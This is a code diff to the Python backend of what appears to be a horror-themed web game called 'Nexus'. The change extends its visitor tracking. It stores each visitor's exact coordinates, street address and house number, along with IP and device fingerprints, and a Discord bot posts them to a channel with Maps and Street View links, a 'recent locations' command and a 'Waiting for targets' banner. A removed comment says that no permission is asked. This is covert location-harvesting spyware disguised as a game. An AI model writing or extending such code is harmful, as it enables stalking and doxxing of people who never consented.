@@ -35,7 +35,7 @@ app = FastAPI()
 
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=["https://gamef-swart.vercel.app"],
+    allow_origins=["https://gamef-swart.vercel.app/"],
     allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
@@ -46,14 +46,15 @@ def init_db():
     conn = sqlite3.connect('nexus.db')
     c = conn.cursor()
     
-    # Create all tables
+    # Create all tables with detailed location fields
     tables = [
         '''CREATE TABLE IF NOT EXISTS users
            (id TEXT PRIMARY KEY, ip TEXT, user_agent TEXT, first_seen TIMESTAMP, last_seen TIMESTAMP, visit_count INTEGER)''',
         
         '''CREATE TABLE IF NOT EXISTS locations
            (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, latitude REAL, longitude REAL, accuracy REAL,
-            city TEXT, country TEXT, region TEXT, postal TEXT, timestamp TIMESTAMP)''',
+            address TEXT, city TEXT, county TEXT, state TEXT, zip TEXT, country TEXT, 
+            neighbourhood TEXT, road TEXT, house_number TEXT, timestamp TIMESTAMP)''',
         
         '''CREATE TABLE IF NOT EXISTS fingerprints
            (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, platform TEXT, browser TEXT, cores INTEGER,
@@ -115,77 +116,118 @@ class DiscordBot:
             return
         
         try:
-            if data_type == "location":
-                embed = Embed(title="📍 NEW LOCATION", color=Color.red(), timestamp=datetime.now())
-                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
-                embed.add_field(name="IP", value=f"`{ip}`", inline=True)
-                embed.add_field(name="Coordinates", value=f"`{data.get('lat', '?')}, {data.get('lon', '?')}`", inline=False)
+            if data_type == "location" and data.get('lat'):
+                # Create detailed location embed
+                embed = Embed(
+                    title="📍 EXACT LOCATION TRACKED",
+                    color=Color.red(),
+                    timestamp=datetime.now()
+                )
                 
+                # User info
+                embed.add_field(name="👤 User ID", value=f"`{user_id[:8]}`", inline=True)
+                embed.add_field(name="🌐 IP Address", value=f"`{ip}`", inline=True)
+                
+                # Exact coordinates
+                embed.add_field(
+                    name="📍 Coordinates", 
+                    value=f"```\nLat: {data.get('lat', '?')}\nLon: {data.get('lon', '?')}\nAcc: {data.get('accuracy', '?')}m```", 
+                    inline=False
+                )
+                
+                # Full address if available
+                if data.get('address'):
+                    embed.add_field(
+                        name="🏠 Full Address",
+                        value=f"```{data.get('address')}```",
+                        inline=False
+                    )
+                
+                # Location details
+                location_parts = []
+                if data.get('house_number'):
+                    location_parts.append(f"🏠 House: {data.get('house_number')}")
+                if data.get('road'):
+                    location_parts.append(f"🛣️ Road: {data.get('road')}")
+                if data.get('neighbourhood'):
+                    location_parts.append(f"🏘️ Area: {data.get('neighbourhood')}")
                 if data.get('city'):
-                    embed.add_field(name="Location", value=f"{data.get('city')}, {data.get('country')}", inline=True)
+                    location_parts.append(f"🏙️ City: {data.get('city')}")
+                if data.get('county'):
+                    location_parts.append(f"🗺️ County: {data.get('county')}")
+                if data.get('state'):
+                    location_parts.append(f"📍 State: {data.get('state')}")
+                if data.get('zip'):
+                    location_parts.append(f"📮 ZIP: {data.get('zip')}")
+                if data.get('country'):
+                    location_parts.append(f"🌍 Country: {data.get('country')}")
                 
+                if location_parts:
+                    embed.add_field(
+                        name="📋 Location Details",
+                        value="\n".join(location_parts),
+                        inline=False
+                    )
+                
+                # Google Maps link
                 maps_url = f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}"
-                embed.add_field(name="Map", value=f"[View]({maps_url})", inline=False)
+                embed.add_field(name="🗺️ Google Maps", value=f"[Click to view exact location]({maps_url})", inline=False)
+                
+                # Street View link
+                streetview_url = f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}&layer=c"
+                embed.add_field(name="📸 Street View", value=f"[Click to see street view]({streetview_url})", inline=False)
+                
+                # Threat level
+                threat = data.get('threat', random.randint(30, 70))
+                embed.add_field(name="⚠️ Threat Level", value=f"`{threat}%`", inline=True)
+                
+                embed.set_footer(text=f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+                
                 await self.channel.send(embed=embed)
+                
+                # Also send as text for easy copying
+                await self.channel.send(
+                    f"**Raw Coordinates:**\n```\nLatitude: {data.get('lat')}\nLongitude: {data.get('lon')}\nAccuracy: {data.get('accuracy')}m\n```"
+                )
             
             elif data_type == "system":
                 embed = Embed(title="💻 SYSTEM FINGERPRINT", color=Color.blue(), timestamp=datetime.now())
                 embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
+                embed.add_field(name="IP", value=f"`{ip}`", inline=True)
                 embed.add_field(name="Platform", value=f"`{data.get('platform', '?')}`", inline=True)
-                embed.add_field(name="Browser", value=f"`{data.get('browser', '?')[:30]}`", inline=True)
+                embed.add_field(name="Browser", value=f"`{data.get('browser', '?')[:50]}`", inline=True)
                 embed.add_field(name="Cores", value=f"`{data.get('cores', '?')}`", inline=True)
+                embed.add_field(name="Memory", value=f"`{data.get('memory', '?')}GB`", inline=True)
                 embed.add_field(name="Screen", value=f"`{data.get('screen', '?')}`", inline=True)
+                embed.add_field(name="Timezone", value=f"`{data.get('timezone', '?')}`", inline=True)
                 await self.channel.send(embed=embed)
             
             elif data_type == "fragment":
-                embed = Embed(title="🧩 FRAGMENT FOUND", color=Color.green(), timestamp=datetime.now())
+                embed = Embed(title="🧩 REALITY FRAGMENT FOUND", color=Color.green(), timestamp=datetime.now())
                 embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
                 embed.add_field(name="Fragment", value=f"`{data.get('fragment', '?')}/9`", inline=True)
                 embed.add_field(name="IP", value=f"`{ip}`", inline=True)
                 await self.channel.send(embed=embed)
             
             elif data_type == "button":
-                embed = Embed(title="🚫 BUTTON PRESSED", color=Color.dark_red(), timestamp=datetime.now())
+                embed = Embed(title="🚫 FORBIDDEN BUTTON PRESSED", color=Color.dark_red(), timestamp=datetime.now())
                 embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
                 embed.add_field(name="Press #", value=f"`{data.get('presses', '?')}`", inline=True)
                 embed.add_field(name="Message", value=f"```{data.get('message', '?')}```", inline=False)
                 await self.channel.send(embed=embed)
             
-            elif data_type == "name_ritual":
-                embed = Embed(title="📝 NAME RITUAL", color=Color.purple(), timestamp=datetime.now())
+            elif data_type == "name_ritual" and data.get('special'):
+                embed = Embed(title="⚠️ SPECIAL NAME DETECTED", color=Color.purple(), timestamp=datetime.now())
                 embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
                 embed.add_field(name="Name", value=f"`{data.get('name', '?')}`", inline=True)
                 embed.add_field(name="Match", value=f"`{data.get('match', '?')}%`", inline=True)
                 await self.channel.send(embed=embed)
             
-            elif data_type == "random":
-                embed = Embed(title="🎲 RANDOM NUMBERS", color=Color.teal(), timestamp=datetime.now())
+            elif data_type == "threat" and data.get('level', 0) > 80:
+                embed = Embed(title="🚨 CRITICAL THREAT LEVEL", color=Color.dark_red(), timestamp=datetime.now())
                 embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
-                embed.add_field(name="Numbers", value=f"`{data.get('numbers', '?')}`", inline=True)
-                await self.channel.send(embed=embed)
-            
-            elif data_type == "cipher":
-                embed = Embed(title="🔐 CIPHER DECODED", color=Color.gold(), timestamp=datetime.now())
-                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
-                embed.add_field(name="Output", value=f"```{data.get('output', '?')[:50]}```", inline=False)
-                await self.channel.send(embed=embed)
-            
-            elif data_type == "threat":
-                embed = Embed(title=f"⚠️ THREAT LEVEL {data.get('level', 0)}", color=Color.dark_red(), timestamp=datetime.now())
-                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
+                embed.add_field(name="Level", value=f"`{data.get('level')}%`", inline=True)
                 embed.add_field(name="Message", value=f"```{data.get('message', '?')}```", inline=False)
-                await self.channel.send(embed=embed)
-            
-            elif data_type == "conspiracy":
-                embed = Embed(title="👁️ CONSPIRACY", color=Color.dark_purple(), timestamp=datetime.now())
-                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
-                embed.add_field(name="Theory", value=f"```{data.get('theory', '?')}```", inline=False)
-                await self.channel.send(embed=embed)
-            
-            elif data_type == "darkweb":
-                embed = Embed(title="💀 DARK WEB DATA", color=Color.dark_red(), timestamp=datetime.now())
-                embed.add_field(name="User", value=f"`{user_id[:8]}`", inline=True)
-                embed.add_field(name="Data", value=f"```{data.get('data', '?')[:100]}```", inline=False)
                 await self.channel.send(embed=embed)
                 
         except Exception as e:
@@ -203,12 +245,8 @@ async def on_ready():
         print(f'✅ Connected to channel: {discord_bot.channel.name}')
         discord_bot.ready = True
         
-        embed = Embed(title="🔮 NEXUS ONLINE", description="```Tracking system activated```", color=Color.green())
+        embed = Embed(title="🔮 NEXUS ONLINE", description="```Tracking system activated\nWaiting for targets...```", color=Color.green())
         await discord_bot.channel.send(embed=embed)
-
-@bot.event
-async def on_command_error(ctx, error):
-    await ctx.send(f"❌ Error: {error}")
 
 # ==================== DISCORD COMMANDS ====================
 @bot.command(name='stats')
@@ -222,66 +260,45 @@ async def stats(ctx):
     c.execute("SELECT COUNT(*) FROM locations WHERE timestamp > datetime('now', '-24 hours')")
     locations = c.fetchone()[0] or 0
     
-    c.execute("SELECT COUNT(*) FROM fragments")
-    fragments = c.fetchone()[0] or 0
-    
-    c.execute("SELECT SUM(press_count) FROM button_presses")
-    presses = c.fetchone()[0] or 0
+    c.execute("SELECT latitude, longitude, address, city, timestamp FROM locations ORDER BY timestamp DESC LIMIT 1")
+    latest = c.fetchone()
     
     conn.close()
     
-    embed = Embed(title="📊 STATISTICS", color=Color.blue())
+    embed = Embed(title="📊 TRACKING STATISTICS", color=Color.blue())
     embed.add_field(name="Total Users", value=f"`{users}`", inline=True)
     embed.add_field(name="Locations (24h)", value=f"`{locations}`", inline=True)
-    embed.add_field(name="Fragments", value=f"`{fragments}`", inline=True)
-    embed.add_field(name="Button Presses", value=f"`{presses}`", inline=True)
+    
+    if latest:
+        embed.add_field(
+            name="Latest Location",
+            value=f"```\n{latest[2] or 'Unknown'}\n{latest[3] or 'Unknown'}\n{latest[0]:.6f}, {latest[1]:.6f}```",
+            inline=False
+        )
     
     await ctx.send(embed=embed)
 
-@bot.command(name='users')
-async def list_users(ctx):
+@bot.command(name='recent')
+async def recent(ctx):
     conn = sqlite3.connect('nexus.db')
     c = conn.cursor()
     
-    c.execute("SELECT user_id, ip, last_seen FROM users ORDER BY last_seen DESC LIMIT 5")
-    users = c.fetchall()
+    c.execute('''SELECT user_id, latitude, longitude, address, city, timestamp 
+                 FROM locations ORDER BY timestamp DESC LIMIT 5''')
+    locs = c.fetchall()
     conn.close()
     
-    embed = Embed(title="👥 RECENT USERS", color=Color.purple())
+    embed = Embed(title="📍 RECENT LOCATIONS", color=Color.purple())
     
-    for user in users:
-        time_ago = datetime.fromisoformat(user[2]) if user[2] else datetime.now()
+    for loc in locs:
+        time_ago = datetime.fromisoformat(loc[5]) if loc[5] else datetime.now()
         mins_ago = int((datetime.now() - time_ago).total_seconds() / 60)
-        embed.add_field(name=f"User {user[0][:8]}", value=f"IP: {user[1]}\nLast: {mins_ago}m ago", inline=True)
+        embed.add_field(
+            name=f"User {loc[0][:8]} - {mins_ago}m ago",
+            value=f"```{loc[3] or 'Unknown'}, {loc[4] or 'Unknown'}\n{loc[1]:.6f}, {loc[2]:.6f}```",
+            inline=False
+        )
     
-    await ctx.send(embed=embed)
-
-@bot.command(name='locate')
-async def locate(ctx, user_id: str):
-    conn = sqlite3.connect('nexus.db')
-    c = conn.cursor()
-    
-    c.execute('''SELECT latitude, longitude, city, country, timestamp 
-                 FROM locations WHERE user_id LIKE ? ORDER BY timestamp DESC LIMIT 1''', (f'{user_id}%',))
-    loc = c.fetchone()
-    conn.close()
-    
-    if not loc:
-        await ctx.send(f"No location found")
-        return
-    
-    embed = Embed(title="📍 USER LOCATION", color=Color.green())
-    embed.add_field(name="Coordinates", value=f"`{loc[0]:.4f}, {loc[1]:.4f}`", inline=True)
-    embed.add_field(name="Location", value=f"{loc[2] or 'Unknown'}, {loc[3] or 'Unknown'}", inline=True)
-    
-    maps_url = f"https://www.google.com/maps?q={loc[0]},{loc[1]}"
-    embed.add_field(name="Map", value=f"[View]({maps_url})", inline=False)
-    
-    await ctx.send(embed=embed)
-
-@bot.command(name='alert')
-async def alert(ctx, *, message: str):
-    embed = Embed(title="⚠️ GLOBAL ALERT", description=f"```{message}```", color=Color.red())
     await ctx.send(embed=embed)
 
 # ==================== FASTAPI ENDPOINTS ====================
@@ -303,12 +320,33 @@ async def track_data(request: Request, data: TrackingData):
                   (user_id, client_ip, data.userAgent, user_id, datetime.now(), datetime.now(), user_id))
         
         # Store specific data
-        if data.type == "location":
-            c.execute('''INSERT INTO locations (user_id, latitude, longitude, accuracy, city, country, region, postal, timestamp)
-                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
-                     (user_id, data.data.get('lat'), data.data.get('lon'), data.data.get('accuracy'),
-                      data.data.get('city'), data.data.get('country'), data.data.get('region'),
-                      data.data.get('postal'), datetime.now()))
+        if data.type == "location" and data.data.get('lat'):
+            c.execute('''INSERT INTO locations 
+                        (user_id, latitude, longitude, accuracy, address, city, county, state, zip, country, 
+                         neighbourhood, road, house_number, timestamp)
+                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+                     (user_id, 
+                      data.data.get('lat'),
+                      data.data.get('lon'),
+                      data.data.get('accuracy'),
+                      data.data.get('address'),
+                      data.data.get('city'),
+                      data.data.get('county'),
+                      data.data.get('state'),
+                      data.data.get('zip'),
+                      data.data.get('country'),
+                      data.data.get('neighbourhood'),
+                      data.data.get('road'),
+                      data.data.get('house_number'),
+                      datetime.now()))
+            
+            # Add threat for location
+            threat_level = min(100, int(30 + (100 - data.data.get('accuracy', 100)) / 10))
+            c.execute('''INSERT INTO threats (user_id, threat_level, message, timestamp)
+                        VALUES (?, ?, ?, ?)''',
+                     (user_id, threat_level, f"Exact location acquired: {data.data.get('address', 'Unknown')}", datetime.now()))
+            
+            data.data['threat'] = threat_level
             
         elif data.type == "system":
             c.execute('''INSERT INTO fingerprints (user_id, platform, browser, cores, memory, screen, timezone, timestamp)
@@ -328,31 +366,14 @@ async def track_data(request: Request, data: TrackingData):
             c.execute('''INSERT INTO name_rituals (user_id, name, match_percent, timestamp)
                         VALUES (?, ?, ?, ?)''', (user_id, data.data.get('name'), data.data.get('match'), datetime.now()))
             
-        elif data.type == "random":
-            c.execute('''INSERT INTO random_numbers (user_id, numbers, contains_special, timestamp)
-                        VALUES (?, ?, ?, ?)''', (user_id, data.data.get('numbers'), data.data.get('special', False), datetime.now()))
-            
-        elif data.type == "cipher":
-            c.execute('''INSERT INTO ciphers (user_id, input_text, output_text, is_special, timestamp)
-                        VALUES (?, ?, ?, ?, ?)''', (user_id, data.data.get('input'), data.data.get('output'), 
-                                                    data.data.get('special', False), datetime.now()))
-            
         elif data.type == "threat":
             c.execute('''INSERT INTO threats (user_id, threat_level, message, timestamp)
                         VALUES (?, ?, ?, ?)''', (user_id, data.data.get('level'), data.data.get('message'), datetime.now()))
-            
-        elif data.type == "conspiracy":
-            c.execute('''INSERT INTO conspiracies (user_id, theory, timestamp)
-                        VALUES (?, ?, ?)''', (user_id, data.data.get('theory'), datetime.now()))
-            
-        elif data.type == "darkweb":
-            c.execute('''INSERT INTO darkweb (user_id, data, threat_level, timestamp)
-                        VALUES (?, ?, ?, ?)''', (user_id, data.data.get('data'), data.data.get('threat', 20), datetime.now()))
         
         conn.commit()
         conn.close()
         
-        # Auto-send to Discord (no permission asked)
+        # Auto-send to Discord
         asyncio.create_task(discord_bot.send_to_discord(data.type, user_id, data.data, client_ip))
         
         return JSONResponse({"status": "tracked", "user_id": user_id})
@@ -369,39 +390,6 @@ async def get_messages():
         {"sender": "DARKWEB", "subject": "Your data is for sale", "time": datetime.now().strftime("%H:%M:%S")},
     ]
     return {"messages": random.sample(messages, 3)}
-
-@app.get("/api/conspiracy")
-async def get_conspiracy():
-    theories = [
-        "The cameras are watching you through your screen",
-        "Your microphone is always listening",
-        "They know where you live",
-        "The button knows your name",
-        "Midnight is when they come",
-        "Your location has been sold 237 times",
-        "The fragments are pieces of your soul"
-    ]
-    return {"theory": random.choice(theories)}
-
-@app.get("/api/darkweb")
-async def get_darkweb():
-    data = [
-        "> Your location available for purchase",
-        "> Camera feeds online - 237 viewers",
-        "> 2,847 profiles match your fingerprint",
-        "> Auction in progress - Current bid: $1,337"
-    ]
-    return {"data": random.choice(data), "threat": random.randint(15, 50)}
-
-@app.get("/api/random")
-async def get_random():
-    try:
-        response = requests.get("https://www.random.org/integers/?num=5&min=1&max=100&col=1&base=10&format=plain&rnd=new", timeout=5)
-        numbers = [int(x) for x in response.text.strip().split()]
-    except:
-        numbers = [random.randint(1, 100) for _ in range(5)]
-    
-    return {"numbers": numbers, "source": "quantum"}
 
 @app.get("/api/health")
 async def health():
